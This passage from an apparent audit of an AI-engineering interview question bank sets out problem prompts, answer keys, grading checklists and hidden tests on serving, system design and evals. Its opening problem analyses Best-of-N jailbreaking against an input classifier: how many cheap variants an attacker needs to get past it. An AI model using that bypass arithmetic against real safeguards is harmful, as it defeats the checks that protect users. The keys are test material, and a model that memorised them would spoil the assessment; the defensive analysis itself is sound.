Modelled on: Best-of-N Jailbreaking (https://arxiv.org/abs/2412.03556); Llama Prompt Guard 2 model card (recall 97.5% at 1% false positive rate for the 86M model, English); OWASP prompt injection cheat sheet (https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html).

Prompt: Your input classifier has 97.5 percent recall at a 1 percent false positive rate on the vendor's English eval. Treat attempts as independent. How many variants does an attacker need for a 50 percent chance that one passes? Then choose and state your daily benign request volume and compute how many benign requests the classifier blocks per day at that operating point. Say what each number means for the design.

Accepted band for attempts: 25 to 30 (ln 0.5 / ln 0.975 = 27.4). The blocked-benign figure is 1 percent of the reader's stated volume and the answer must say who those users are likely to be (non-English traffic, security researchers) per the guardrails lesson's "When this is wrong".

What a strong answer contains: that independence overstates the attacker's difficulty if variants share a weakness and understates it if the classifier is adaptive; that the attacker's cost per attempt is near zero so 27 is not a deterrent; that the false-positive cost is paid every day by real users while the recall benefit is paid only during attacks; and therefore the classifier's place in the design is a rate reducer in front of structural controls.

Staff follow-ups: the vendor offers a 22M model at 88.7 percent recall and a fifth of the latency; which do you deploy where? Legal asks you to state the probability of a leak; what do you refuse to put a number on?

### 4.7 inference

**I1. Disaggregate or tune: a mixed workload on sixteen GPUs** (type: design, difficulty: hard, seniority: [staff])

Modelled on: DistServe (https://arxiv.org/abs/2401.09670; goodput); Sarathi-Serve (https://arxiv.org/abs/2403.02310); vLLM optimization docs on `max_num_batched_tokens` (https://docs.vllm.ai/en/latest/configuration/optimization.html); techinterview.org's inference infrastructure prep post (https://www.techinterview.org/post/3233475331/ai-inference-infrastructure-interview-prep-2026-vllm-triton/); Llama 3 70B KV figures from the Llama 3 paper (https://arxiv.org/html/2407.21783).

Prompt (scenario inputs labelled): 70 percent of traffic is short chat; 30 percent carries pasted documents with a p50 prompt of 20,000 tokens; SLOs are TTFT p95 under 1 second and ITL p95 under 60 ms; you have sixteen 80 GB GPUs and a Llama 3 70B-shaped model. Choose between tuning chunked prefill on one pool, two pools split by predicted prompt length, and prefill-decode disaggregation with KV transfer. Quantify what each costs and pick.

What a strong answer contains: the KV transfer bytes for a 20,000-token prompt (20,000 × 327,680 bytes = 6.55 GB per request in BF16) against the interconnect the reader states, which decides whether disaggregation is viable at the long-prompt arrival rate; the chunked-prefill trade (smaller budget protects ITL and worsens the long request's TTFT); the two-pool design's failure mode (length prediction errors and pool imbalance); goodput as the metric rather than throughput; and what is given up by the chosen option, with the load test that would reverse it.

Staff follow-ups: the long-document share doubles next quarter; which option degrades gracefully? Finance will not buy more GPUs; which SLO do you renegotiate and how do you present it?

**I2. Throughput collapsed at 2 a.m. with no deploy** (type: debug, difficulty: hard, seniority: [senior, staff])

Modelled on: vLLM V1 metrics names (https://raw.githubusercontent.com/vllm-project/vllm/main/vllm/v1/metrics/loggers.py); vLLM V1 recompute preemption default (https://docs.vllm.ai/en/latest/configuration/optimization.html); vLLM prefix caching design (https://docs.vllm.ai/en/latest/design/prefix_caching.html); the amitshekhariitbhu "p99 doubled after a deploy" question (https://github.com/amitshekhariitbhu/ai-engineering-interview-questions).

Prompt: Dashboards (provided, scenario) between 01:50 and 02:30: `num_requests_waiting` climbs from near zero to the hundreds; `kv_cache_usage_perc` rises to near 100; `num_preemptions` goes from zero to a steady rate; prefix cache hit rate falls from 47 percent to 9 percent; GPU power draw is unchanged; replica count is unchanged; a nightly job that embeds and summarises long, unique documents started at 01:50 through the same endpoint. No deploy occurred. Pick the mechanism that explains the collapse, name the second defect, and say what you would have needed to know to be sure.

Choices (equal length): a GPU clock throttle; a memory leak in the engine; unique long prompts evicting the shared prefix and filling the KV cache so that running requests are preempted and recomputed, each recompute re-filling the cache in a storm; the autoscaler scaled in; a network partition between replicas and the gateway.

Answer: the preemption and recompute storm triggered by the batch job's long unique prompts, with the prefix-cache collapse as the visible symptom. The second defect is that batch traffic shares an interactive endpoint with no admission control or separate pool. What was missing: per-request prompt lengths by client, which the dashboard does not show and the reader should ask for before concluding.

Staff follow-ups: the batch job's owner says it has run for months; what changed, and how do you find out without blaming them? You can either cap prompt tokens per client or buy a separate pool; which do you do tonight, and which do you write up?

**I3. A step scheduler with chunked prefill and a token budget** (type: code, difficulty: hard, seniority: [staff])

Modelled on: vLLM V1 alpha release blog (https://vllm.ai/blog/2025-01-27-v1-alpha-release; one scheduler assigning tokens per request per step); Sarathi-Serve (stall-free batching); PagedAttention (https://arxiv.org/abs/2309.06180); techinterview.org's "implement a memory allocator for variable-size KV cache" listing (https://www.techinterview.org/post/3233475331/ai-inference-infrastructure-interview-prep-2026-vllm-triton/).

Prompt: Implement `schedule(running, waiting, budget_tokens, allocator) -> dict[rid, n_tokens]` for one engine step. Running requests in decode need one token each and must not be starved; waiting requests are admitted FCFS as prefill chunks within the remaining token budget and only if the allocator (the `inf-006` block allocator) can give them blocks; when a running request cannot get a block for its next token, preempt by a policy you choose and document, freeing its blocks. Return the per-request token assignment and the list of preempted ids.

Hidden tests check invariants, not a canonical schedule: the sum of assigned tokens never exceeds the budget; every running request gets one token or is in the preempted list; a preempted request is at the head of the waiting queue; no prefill chunk is scheduled while a decode is starved; admission never exceeds free blocks; a 30,000-token prompt with a 2,048 budget takes at least 15 steps and decodes continue in every one of them; the scheduler is deterministic given the same inputs.

What the reference solution explains: why decodes are scheduled first; the preemption choice (newest first wastes the least recompute) and what it costs in fairness; why the budget trades ITL against TTFT; and what a real engine adds (priorities, speculative tokens per request, prefix-cache-aware admission).

Staff follow-ups: a tenant with one huge prompt starves everyone within the rules; what rule do you add and what does it break? Make preemption swap to CPU instead of recompute: which tests change?

### 4.8 system-design

**SD1. Resolution rate up, re-contacts up: decide** (type: workflow, difficulty: hard, seniority: [staff])

Modelled on: techinterview.org's support-assistant prompt with the follow-up "how do you know it's helping and not making things worse" (https://www.techinterview.org/post/3233476824/ai-engineer-interview-rag-agents-evals/); tau-bench pass^k (https://arxiv.org/abs/2406.12045); tau2-bench dual control (https://arxiv.org/abs/2506.07982); Anthropic's note of starting evals with about 20 real queries (https://www.anthropic.com/engineering/multi-agent-research-system).

Prompt (scenario inputs labelled): six weeks after launch, resolution without a human is up 12 points in the treatment group; re-contact within seven days is up 4 points; CSAT is flat; the holdout is 5 percent of users; support leadership wants to expand to 100 percent next week; the docs team says 30 percent of the help centre is stale. Design the analysis and write the decision: expand, hold, or roll back, with what you would need to see to change it.

Checklist:

- Decomposes "resolved" into deflected versus answered using the re-contact and holdout data, and names the confound (seasonality) the holdout controls for and the one it does not (user mix).
- Sizes the holdout: at 5 percent, states what effect size it can detect and whether the 4-point re-contact rise is distinguishable from noise with the stated numbers, showing the arithmetic.
- Pulls traces for re-contacted conversations and classifies them before deciding; treats the stale help-centre share as a system component with its own fix.
- Proposes a staged expansion with rollback triggers on re-contact and escalation-after-answer, not on resolution.
- Reports pass^k on the eval set for the current prompt so leadership sees reliability, not a single rate.
- Writes the decision with what each stakeholder gives up.
- Judgement item: expanding to 25 percent while the trace review runs is acceptable; 100 percent is not, and the memo says why in one sentence.

Staff follow-ups: leadership says the holdout is costing money every week; when do you end it? The docs team cannot fix stale articles for a quarter; do you ship with a freshness filter that lowers resolution?

**SD2. What a 1M-token context promise costs** (type: estimate, difficulty: hard, seniority: [senior, staff])

Modelled on: Anthropic pricing note that the full 1M context is billed at standard rates on recent models (https://platform.claude.com/docs/en/about-claude/pricing); Llama 3 70B configuration (https://arxiv.org/html/2407.21783); DeepSeek-V3 config for MLA (https://huggingface.co/deepseek-ai/DeepSeek-V3/raw/main/config.json); NVIDIA H100 figures (https://www.nvidia.com/en-us/data-center/h100/); Kaplan et al. 2N FLOPs per token (https://arxiv.org/abs/2001.08361).

Prompt: Product wants to promise "paste anything up to a million tokens". For a Llama 3 70B-shaped GQA model, estimate the KV cache for one 1M-token sequence in BF16, the prefill time floor on one H100 at the dense FP8 figure, and then say what architecture or serving choice makes the promise feasible and what the user experience must therefore be.

Accepted band for the GQA KV cache: 300 to 350 GB (327,680 bytes × 10^6 = 327.68 GB, more than four 80 GB GPUs of memory for one sequence before weights). Prefill floor: 2 × 70 × 10^9 × 10^6 = 1.4 × 10^17 FLOPs at 1.979 × 10^15 FLOPs per second is about 71 seconds on one GPU, before attention's own quadratic term.

What a strong answer contains: that the promise is not a configuration flag; MLA-style caching (70,272 bytes per token, 70.3 GB per sequence) or sliding-window layers or KV quantization are what make it storable, tensor parallelism what makes it fast enough, and a cached document prefix what makes a second question affordable; that time-to-first-token for a cold 1M prompt is a batch-style experience and the UI must say so; and that on a hosted API the bill per request at standard rates is the number product needs to see next to the promise.

Staff follow-ups: a competitor advertises the same window; what do you tell product about what they are probably doing? Which of the three mitigations can you buy, which must you train, and which changes the model's answers?

**SD3. Critique this design document** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: techinterview.org's OpenAI applied-track topics, a multi-tenant chat backend with billing and moderation (https://www.techinterview.org/post/3233474915/openai-interview-process-2026-team-by-team/); Anthropic rate limits and usage fields (https://platform.claude.com/docs/en/api/rate-limits; total input is cache read plus cache creation plus `input_tokens`); Stripe meters and recording usage (https://docs.stripe.com/billing/subscriptions/usage-based/recording-usage; corrections only within 24 hours); Redis LangCache concepts (https://redis.io/docs/latest/develop/ai/context-engine/langcache/concepts/; a semantic cache gives up the guarantee that a hit is correct); OpenAI conversation state (https://developers.openai.com/api/docs/guides/conversation-state).

Prompt: A two-page design (provided) for a multi-tenant chat platform that: uses the provider's stored responses as the conversation record; bills tenants from `input_tokens` and `output_tokens`; shares one semantic response cache across tenants to cut cost; moderates input only; sends meter events to the billing provider from the request path with no idempotency key; assumes rate limits are per tenant; has no price versioning. Review it.

Checklist: one item per defect, each tied to the source that shows the consequence (the under-billing arithmetic from the usage fields; the 24-hour correction window; the cross-tenant leak and wrong-answer risk of a shared semantic cache; provider state expiring and billing history anyway; moderation of output; organisation-level rate limits), plus two judgement items: a per-tenant exact-match response cache is acceptable with model and prompt version in the key; a semantic cache is acceptable only for a tenant's own FAQ-like traffic with a short TTL.

Staff follow-ups: the author pushes back that the semantic cache saves 40 percent of model cost in their test; what test would you accept? Billing is already live for ten tenants with the `input_tokens` bug; do you re-invoice?

### 4.9 rounds

**RD1. A KV-cache decode step that equals the full recompute** (type: code, difficulty: hard, seniority: [senior, staff])

Modelled on: the from-scratch questions on KV cache decoding and grouped-query attention in the amitshekhariitbhu bank (https://github.com/amitshekhariitbhu/ai-engineering-interview-questions); GQA (https://arxiv.org/abs/2305.13245); Online normalizer calculation for softmax (https://arxiv.org/abs/1805.02867); flagged as "Good staff-level stretch" and not built in `research/tracks/rounds.md` (R4 Q3).

Prompt: Implement `attention_full(Q, K, V, n_q_heads, n_kv_heads)` for causal grouped-query attention in plain Python lists, and a `DecodeState` with `append(k_new, v_new)` and `step(q_new)` that returns the same output for the newest position as the full recompute's last row. Use the online normaliser so no step materialises a full row of scores. Decide and document how query heads map to KV heads.

Hidden tests: equality with the full recompute within tolerance across random shapes where `n_q_heads` is a multiple of `n_kv_heads`; a one-token sequence; a sequence longer than any visible test; a head-mapping test that fails if heads are grouped round-robin instead of contiguously (or the reverse, per the documented choice); a test that the state's memory grows by exactly one K and one V per KV head per step.

What the reference explains: the invariant (decode equals the last row of full attention), where GQA changes the indexing, why the online normaliser is the same arithmetic as the blockwise kernels, and what breaks when RoPE is added (positions must be applied before caching K).

Staff follow-ups: make the cache paged with block size 16 using the `inf-006` allocator and show which tests change. Where would you put a padding mask and what does a fully masked row return?

**RD2. The eval said ship and you said no** (type: behavioural, difficulty: hard, seniority: [staff])

Modelled on: Amazon's STAR guidance (https://www.aboutamazon.com/news/workplace/amazon-interview-guide; precise metrics, "I"); OpenAI interview guide (https://openai.com/interview-guide/; openness to feedback); the aced.io report of an Anthropic question about confident but wrong answers in high-risk contexts (https://www.aced.io/blog/ai-engineer-interview-questions).

Prompt: "Tell me about a time the numbers said ship and you blocked it, or the numbers said stop and you shipped. What evidence did you have, who disagreed, what did you put in writing, and how did you find out whether you were right?" Prepare the story in two lengths.

What a strong answer contains (the rubric the reader self-rates against): the specific evidence and its gap (what the metric measured and what it did not); the disagreement named as a person and a position, not "stakeholders"; the written artefact (a risk note, a go or no-go memo) and what it committed to; the cost of the decision in time or money, stated; the follow-up measurement that showed whether the call was right; one thing the teller would do differently; and "I" for the teller's actions throughout.

Staff follow-ups: you were wrong; tell that version. Your manager overruled you; what did you do the next day? How did you keep the relationship with the person who disagreed?

**RD3. Review a submitted take-home** (type: critique, difficulty: hard, seniority: [senior, staff])

Modelled on: the techinterview.org take-home description, 50 markdown documents, 20 questions, recall@5 and faithfulness (https://www.techinterview.org/post/3233476824/ai-engineer-interview-rag-agents-evals/); Anthropic, Designing AI-resistant technical evaluations (https://www.anthropic.com/engineering/AI-resistant-technical-evaluations); OpenAI interview guide on take-home assessment criteria (https://openai.com/interview-guide/).

Prompt: You are the reviewer. A submission's README (provided) claims recall@5 of 19 of 20 on questions "generated by an LLM from the chunks", faithfulness of 0.98 from a judge with no human check, "a significant improvement from 17 to 19 after adding a reranker", no unanswerable questions in the set, one run per configuration, and a dependency list with no versions. The code is clean. Write the review and the hiring recommendation.

Checklist:

- Questions generated from the indexed chunks share wording with them, so recall@5 measures lexical overlap; the reviewer asks for questions written from the documents.
- A faithfulness number from an unchecked judge on 20 items is a judge opinion; the candidate could have read all 20.
- 17 to 19 of 20 is two questions; the claim of significance is the problem, not the improvement.
- No unanswerable questions means refusal behaviour was never tested.
- One run per configuration with a nondeterministic model.
- Unpinned dependencies make the result unreproducible.
- What the submission did well (clean code, correct metric definitions, honest scoping) stated first, because the review is also a calibration of the reviewer.
- Judgement item: a candidate who made these mistakes but wrote the limitations section themselves is a different hire from one who did not; the recommendation says which this is and what the follow-up interview should probe.

Staff follow-ups: the hiring manager liked the demo and wants to skip the follow-up; what do you say? Two reviewers disagree on this submission; how does the panel decide without the loudest voice winning?

## 5. Rewrite entirely, or cut the easy parts

Criteria: rewrite when the file's premise is below the bar (its question is a phone-screen question, its MCQ is vocabulary, its lesson spends most of its words on what the reader knows). Cut when the senior content is present and the junior parts can be removed without changing the structure.

### 5.1 Lessons

Rewrite entirely:

- `foundations/tokens/overview.mdx`: keep the measured counts, the pre-tokenizer regex difference and the special-token security note as a reference table; the lesson becomes "the tokenizer as a cost, capacity and security surface" with the tokenizer-change break-even (F3) as its question.
- `foundations/attention/overview.mdx`: merge with the KV material in `inference-anatomy` into one lesson on attention layouts as serving decisions (F1); drop the hash-map section, the sqrt(d_k) derivation (keep one line and the source), and the "walk me through self-attention" question.
- `rag/retrieval-foundations/overview.mdx`: drop the definitions of inverted index, embeddings, ANN and the four metrics; keep BM25's IDF form and the Postgres gotcha, LIMIT, pgvector filtering, the index limits table; the question becomes R1.
- `system-design/framework/overview.mdx`: the rubric and the five scoping questions survive as a one-page reference; the lesson is replaced by a decision-under-conflict lesson built around SD1.
- `evals/eval-thinking/overview.mdx`: keep the OpenTelemetry section and the "first upstream failure" rule; the rest is replaced by the labelling-operation material (E1).
- `apis/api-anatomy/overview.mdx`: keep the stop-reason list, the stream event order with its four traps, the two kinds of 429 and the provider comparison table; drop "an RPC with three odd properties", the streaming explanation, the token-bucket analogy and the stacked-retries predict; the question becomes A1.
- `rounds/ai-collab-coding/overview.mdx`: the policy table becomes a dated reference page; the lesson is the differential-testing and review discipline, with RD3 as its question.

Cut the easy parts only:

- `apis/context-engineering/overview.mdx`: cut "Context is a budget, not a bucket" and the four-moves list; keep cache mechanics, the price table, what breaks the cache, the two measurement traps and the arithmetic; replace the question with A3's follow-ups.
- `evals/llm-judge/overview.mdx`: cut the predict and the TPR/TNR definitions; keep bias tests, the correction formula with its precondition, pairwise versus pointwise, "When not to use a judge".
- `rag/debugging-rag/overview.mdx`: cut the opening scenario and the subtraction predict; keep the taxonomy table, the triage function, oracle context, the field guide.
- `agents/agent-loop/overview.mdx`: cut the while-loop section and the interpreter analogy; keep the quadratic cost arithmetic, the three budgets and the detector, the error contract, cache hygiene; add AG2 as the question.
- `agents/coding-agents/overview.mdx`: cut the OSWorld paragraph and the sandbox predict; keep permission evaluation order, compound-command splitting, the two walls, the gate code. This is the seed of the harness track; AG1 is its question.
- `safety/threat-modeling/overview.mdx`: cut the SQL-injection section, the direct/indirect definitions, the trifecta list and the package-hallucination predict; keep EchoLeak as the one real incident, the OWASP 2025 to 2026 renumbering note, the MCP security page items, the image filter.
- `safety/guardrails/overview.mdx`: cut the WAF paragraph and the filters/walls definitions; keep the classifier operating points, the stacking arithmetic with its caveat, CaMeL and the provenance sketch, multi-tenant filter placement, approval design.
- `inference/inference-anatomy/overview.mdx`: cut "Two phases, in a systems engineer's terms" and the latency vocabulary; keep roofline and ridge point, the KV table by model, goodput and MBU, the engine metric names.
- `inference/batching/overview.mdx`: cut the worker-pool analogy and the static-batching predict; keep PagedAttention and the allocator, chunked prefill and the budget knob, preemption and fairness.
- `system-design/capacity/overview.mdx`: cut the bill-of-materials opener and "History is re-sent"; keep the break-even derivation, the Little's law sizing with its code, rate limits as capacity.
- `rounds/hand-write/overview.mdx`: cut the practical notes and the top-p predict; keep the invariants table with the junior rows removed, the online normaliser; RD1 is its question.

### 5.2 Problems read

Rewrite entirely (the premise is below the bar; replace with the section 4 problems of the same type and module, or delete under the new one-easy-per-module rule): `fnd-003`, `fnd-005`, `api-001`, `api-007`, `evl-003`, `evl-017`, `rag-001`, `rag-010`, `agt-007`, `sfe-007`, `inf-012`, `sys-003`, `rnd-005`, `rnd-009`, `rnd-013`. Also `rnd-016` (STAR explanation; replace with RD2) and `sfe-017` (generic "investigate, constrain, escalate"; replace with S1).

Cut the easy parts (the senior content is there):

- `fnd-008`: remove the logprob line and hint 2; the reader must ask for the logprobs. Add the "what would you need to be sure" element.
- `fnd-009`: remove hints 1 and 2; make activations and ZeRO sharding the question, not the follow-up.
- `fnd-012`: remove the rhetorical hints; add a decision (full document versus retrieval) with a cost.
- `fnd-013`: remove the subtitle and hint 2; add the length-bias defect as a secondary real defect.
- `api-006`: remove the grading paragraph; equalise option-free prose; keep.
- `api-009`: move the rule bullets out of the Question into hidden tests; keep the fixtures.
- `api-014`: remove "The strongest answers"; add the deletion-request and cache-cost conflict as the decision.
- `api-016`: remove "Interviewers grading"; add the 60-day deadline and the regressions (becomes A2's sibling).
- `evl-001`: remove the three evidence lines that name the answer; the reader lists what to pull.
- `evl-007`, `evl-012`, `evl-013`: remove definitional sentences and one-word follow-ups; add the pushback follow-ups from section 3.4.
- `evl-014`: remove hints 2 and 3; keep. Pair with E2.
- `rag-004`: remove hint 2 and the arithmetic from the correct option; equalise lengths.
- `rag-011`: remove the given latency model; the reader specifies how they would measure it, then computes with their own numbers inside a wider band.
- `rag-013`: keep; make the follow-ups adversarial (the vendor's cost ratios).
- `rag-014`: remove the code comment and hint 2; add the chunker bump as a secondary defect (or replace with R2).
- `rag-016`: remove the structure hints; add the freshness-versus-permissions conflict (R1).
- `agt-002`: remove hint 3 and "unlocked below" from the option text.
- `agt-004`: remove hint 3; keep.
- `agt-010`: remove hint 1; otherwise at the bar.
- `agt-011`: remove the code comment and hint 2; add the `customer_id` authorization gap as the secondary defect to rank.
- `agt-012`: remove hint 2 and "The detail that separates answers"; otherwise at the bar.
- `agt-018`: remove "The interviewer is checking"; add the organisational follow-ups.
- `sfe-001`, `sfe-002`: equalise option lengths; remove the rhetorical hints.
- `sfe-003`: remove "A strong answer spends one paragraph"; add the CISO and PM constraint (S1).
- `sfe-011`: remove hint 1; add product's cost data as the pushback.
- `sfe-012`: remove the two prose sentences and the two code comments that state the bugs.
- `inf-001`: keep as a concept problem; cut the "answer as you would in the room" framing.
- `inf-003`: remove hint 1; make FP8 versus BF16 and the GPU count a reader decision.
- `inf-005`: remove the hints; keep.
- `inf-006`: keep as is. This is the bar.
- `inf-007`: shorten the correct option to the length of the others.
- `inf-014`: remove the diff comment and add a second changed engine line as a red herring; keep.
- `sys-001`, `sys-006`, `sys-009`, `sys-010`, `sys-012`: delete the "Rubric check" paragraphs; add one operating constraint and one "what you give up" line each; convert the rubric into a `checklist`.
- `sys-013`: keep; add the deadline conflict (A2 covers it in apis; here keep it as the rollout mechanics problem).
- `rnd-010`: keep; remove the hints that name the deliverable.
- `rnd-012`: remove hint 2.
- `rnd-015`: keep.

### 5.3 Files not read

For the 93 problems and 27 lessons not read, apply the rules mechanically before any manual pass: delete or rewrite every `difficulty: easy` file beyond one per module (17 easy files in the bank); flag every choice-based file where the correct option is the longest (45 of 50 bank-wide; the script in this audit's method finds them); strip every hint that names a mechanism or a formula; delete every sentence matching the ban list in section 3.5 (the grep for "strongest answers", "listening for", "Interviewers grading", "separates", "interviewer is checking" finds 11 problem files; the grep for "You already know", "You have used", "If you have written", "Think of a", "You have sat" finds every lesson read).

## 6. Sources

All URLs below were recorded in the repository's lesson and problem frontmatter or `research/tracks/*.md` with `updated: 2026-10-28`. Date checked for each: 2026-10-28 (repository record; not re-fetched by this audit).

Interview reports and question banks:
- amitshekhariitbhu, AI Engineering Interview Questions: https://github.com/amitshekhariitbhu/ai-engineering-interview-questions
- ombharatiya, AI system design guide question bank: https://github.com/ombharatiya/ai-system-design-guide/blob/main/00-interview-prep/01-question-bank.md
- PracHub, Implement and analyze custom attention: https://prachub.com/interview-questions/implement-and-analyze-custom-attention
- PracHub, Debug a GRPO training loop: https://prachub.com/interview-questions/debug-a-grpo-training-loop-and-explain-ratios
- Hello Interview community, RAG system design (Scale AI Principal, Atlassian Staff reports): https://www.hellointerview.com/community/questions/rag-system-design/cmoaemvhf1emv09adwqq9wk3f
- techinterview.org, applied-AI engineer interviews 2026: https://www.techinterview.org/post/3233476824/ai-engineer-interview-rag-agents-evals/
- techinterview.org, OpenAI interview process by team: https://www.techinterview.org/post/3233474915/openai-interview-process-2026-team-by-team/
- techinterview.org, ML engineer interview post-LLM era: https://www.techinterview.org/post/3233474925/ml-engineer-interview-post-llm-era/
- techinterview.org, AI inference infrastructure interview prep: https://www.techinterview.org/post/3233475331/ai-inference-infrastructure-interview-prep-2026-vllm-triton/
- getperspective.ai, Anthropic Applied AI Engineer interview process: https://getperspective.ai/blog/anthropic-applied-ai-engineer-interview-process-frontier-lab-2026/markdown
- aced.io, AI Engineer Interview Questions: https://www.aced.io/blog/ai-engineer-interview-questions
- Anthropic, Designing AI-resistant technical evaluations: https://www.anthropic.com/engineering/AI-resistant-technical-evaluations
- OpenAI interview guide: https://openai.com/interview-guide/
- Amazon interview guide (STAR): https://www.aboutamazon.com/news/workplace/amazon-interview-guide

Engineering posts and documentation:
- OpenAI, Unrolling the Codex agent loop: https://openai.com/index/unrolling-the-codex-agent-loop/
- Anthropic, Effective harnesses for long-running agents: https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents
- Anthropic, Effective context engineering for AI agents: https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
- Anthropic, How we built our multi-agent research system: https://www.anthropic.com/engineering/multi-agent-research-system
- Anthropic, Building effective agents: https://www.anthropic.com/engineering/building-effective-agents
- Anthropic, Demystifying evals for AI agents: https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents
- Anthropic, Claude Code sandboxing: https://www.anthropic.com/engineering/claude-code-sandboxing
- Claude Code permissions: https://code.claude.com/docs/en/permissions
- Claude docs, prompt caching: https://platform.claude.com/docs/en/build-with-claude/prompt-caching
- Claude docs, context editing: https://platform.claude.com/docs/en/build-with-claude/context-editing
- Claude docs, compaction: https://platform.claude.com/docs/en/build-with-claude/compaction
- Claude docs, rate limits: https://platform.claude.com/docs/en/api/rate-limits
- Claude docs, API errors: https://platform.claude.com/docs/en/api/errors
- Claude docs, model deprecations: https://platform.claude.com/docs/en/about-claude/model-deprecations
- Claude docs, migration to API version 2026-10-21: https://platform.claude.com/docs/en/api/migration-2026-10-21
- Claude docs, pricing: https://platform.claude.com/docs/en/about-claude/pricing
- OpenAI docs, prompt caching: https://developers.openai.com/api/docs/guides/prompt-caching
- OpenAI docs, rate limits: https://developers.openai.com/api/docs/guides/rate-limits
- OpenAI docs, conversation state: https://developers.openai.com/api/docs/guides/conversation-state
- OpenAI docs, embeddings: https://developers.openai.com/api/docs/guides/embeddings
- OpenAI API pricing: https://developers.openai.com/api/docs/pricing
- LiteLLM proxy reliability: https://docs.litellm.ai/docs/proxy/reliability
- Marc Brooker, Exponential Backoff and Jitter: https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/
- Marc Brooker, Timeouts, retries and backoff with jitter: https://builder.aws.com/content/3EumjoZascWd1oZiEgL8ORlv3qE/timeouts-retries-and-backoff-with-jitter
- Agent Skills specification: https://agentskills.io/specification
- MCP Security Best Practices 2026-07-28: https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices
- MCP authorization 2026-07-28: https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization
- Invariant Labs, MCP tool poisoning: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
- Simon Willison, The lethal trifecta: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Meta AI, Agents Rule of Two: https://ai.meta.com/blog/practical-ai-agent-security/
- OWASP LLM Prompt Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
- Llama Prompt Guard 2 86M model card: https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M
- Hamel Husain and Shreya Shankar, AI Evals FAQ: https://hamel.dev/blog/posts/evals-faq/
- ai-evals-course/judgy: https://github.com/ai-evals-course/judgy
- pgvector README: https://github.com/pgvector/pgvector
- Pinecone, implement multitenancy: https://docs.pinecone.io/guides/index-data/implement-multitenancy
- Microsoft 365 Copilot privacy: https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-privacy
- Cohere docs, models: https://docs.cohere.com/docs/models
- vLLM optimization docs: https://docs.vllm.ai/en/latest/configuration/optimization.html
- vLLM prefix caching design: https://docs.vllm.ai/en/latest/design/prefix_caching.html
- vLLM V1 alpha release: https://vllm.ai/blog/2025-01-27-v1-alpha-release
- vLLM V1 metrics loggers: https://raw.githubusercontent.com/vllm-project/vllm/main/vllm/v1/metrics/loggers.py
- NVIDIA H100: https://www.nvidia.com/en-us/data-center/h100/
- Stripe, record usage for billing: https://docs.stripe.com/billing/subscriptions/usage-based/recording-usage
- Redis LangCache concepts: https://redis.io/docs/latest/develop/ai/context-engine/langcache/concepts/
- Thinking Machines, LoRA Without Regret: https://thinkingmachines.ai/blog/lora/
- Thinking Machines, Defeating Nondeterminism in LLM Inference: https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/

Papers and model configurations:
- Gemma 3 Technical Report: https://arxiv.org/abs/2503.19786
- DeepSeek-V2: https://arxiv.org/abs/2405.04434
- DeepSeek-V3 config: https://huggingface.co/deepseek-ai/DeepSeek-V3/blob/main/config.json
- GQA: https://arxiv.org/abs/2305.13245
- Llama 3.1 70B config: https://huggingface.co/unsloth/Meta-Llama-3.1-70B-Instruct/blob/main/config.json
- The Llama 3 Herd of Models: https://arxiv.org/html/2407.21783
- ZeRO: https://arxiv.org/abs/1910.02054
- QLoRA: https://arxiv.org/abs/2305.14314
- Petrov et al., tokenizer unfairness between languages: https://arxiv.org/abs/2305.15425
- Kaplan et al., Scaling Laws: https://arxiv.org/abs/2001.08361
- Online normalizer calculation for softmax: https://arxiv.org/abs/1805.02867
- PagedAttention: https://arxiv.org/abs/2309.06180
- Sarathi-Serve: https://arxiv.org/abs/2403.02310
- DistServe: https://arxiv.org/abs/2401.09670
- Evan Miller, Adding Error Bars to Evals: https://arxiv.org/abs/2411.00640
- McNemar's test: https://en.wikipedia.org/wiki/McNemar%27s_test
- Who Validates the Validators: https://arxiv.org/abs/2404.12272
- Zheng et al., Judging LLM-as-a-Judge: https://arxiv.org/html/2306.05685v4
- Tripathi et al., Pairwise or Pointwise: https://arxiv.org/abs/2504.14716
- Panickssery et al., LLM evaluators favor their own generations: https://arxiv.org/abs/2404.13076
- Barnett et al., Seven Failure Points: https://arxiv.org/abs/2401.05856
- EchoLeak: https://arxiv.org/abs/2509.10540
- CaMeL: https://arxiv.org/abs/2503.18813
- Design Patterns for Securing LLM Agents: https://arxiv.org/abs/2506.08837
- Best-of-N Jailbreaking: https://arxiv.org/abs/2412.03556
- tau-bench: https://arxiv.org/abs/2406.12045
- tau2-bench: https://arxiv.org/abs/2506.07982
